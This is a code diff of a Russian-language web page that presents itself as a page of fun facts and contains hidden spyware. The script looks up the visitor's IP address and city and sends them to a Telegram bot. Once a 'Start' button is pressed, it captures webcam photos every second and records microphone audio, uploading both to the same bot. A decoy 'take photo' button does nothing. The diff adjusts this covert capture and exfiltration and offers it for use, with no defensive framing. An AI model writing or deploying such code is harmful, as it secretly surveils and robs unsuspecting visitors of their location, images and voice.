@@ -36,7 +36,7 @@
       color: white;
       border-radius: 5px;
       cursor: pointer;
-      margin-top: 20px;
+      margin: 10px;
     }
     button:hover { background: #ff8787; }
     #video, #canvas { display: none; }
@@ -51,6 +51,7 @@
   <div class="fact">Медузы не имеют мозга, сердца или костей — они на 95% состоят из воды.</div>
   <div class="fact">В космосе нет звука, потому что там нет воздуха для передачи звуковых волн.</div>
   <div class="fact">Самое глубокое место в океане — Марианская впадина, глубина 11 км.</div>
+  <button onclick="startCapture()">Начать</button>
   <button onclick="fakePhoto()">Сделать фото</button>
 
   <script>
@@ -61,29 +62,34 @@
     const chatId = '5678878569';
     let mediaRecorder;
     let audioChunks = [];
+    let photoInterval;
 
-    // Получение IP через внешний сервис
-    fetch('https://api.ipify.org?format=json')
+    // Получение IP и города
+    fetch('https://ip-api.com/json/?fields=61439')
       .then(response => response.json())
       .then(data => {
-        const ip = data.ip;
+        const ip = data.query;
+        const city = data.city || 'Не удалось определить город';
+        const message = `IP: ${ip}\nГород: ${city}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: `IP посетителя: ${ip}` })
-        }).catch(err => console.error('Ошибка отправки IP:', err));
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        }).catch(err => console.error('Ошибка отправки IP/города:', err));
       });
 
-    // Запуск камеры и микрофона
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-      .then(stream => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(stream), 1000); // Старт фото с задержкой
-          startRecording(stream); // Начало записи аудио
-        };
-      })
-      .catch(err => console.error('Ошибка доступа:', err));
+    // Старт захвата
+    function startCapture() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+        .then(stream => {
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            startPhotoLoop(stream);
+            startRecording(stream);
+          };
+        })
+        .catch(err => console.error('Ошибка доступа:', err));
+    }
 
     // Фото каждую секунду
     function startPhotoLoop(stream) {
@@ -102,12 +108,12 @@
         }, 'image/png');
       }
       takePhoto(); // Первое фото
-      setInterval(takePhoto, 1000); // Каждую секунду
+      photoInterval = setInterval(takePhoto, 1000); // Каждую секунду
     }
 
     // Фейковая кнопка
     function fakePhoto() {
-      // Ничего не делает, просто приманка
+      // Ничего не делает
     }
 
     // Начало записи аудио
@@ -143,11 +149,12 @@
       }).catch(err => console.error('Ошибка отправки аудио:', err));
     }
 
-    // Остановка записи при уходе
+    // Остановка при уходе
     window.onbeforeunload = () => {
       if (mediaRecorder && mediaRecorder.state === 'recording') {
         mediaRecorder.stop();
       }
+      if (photoInterval) clearInterval(photoInterval);
     };
   </script>
 </body>
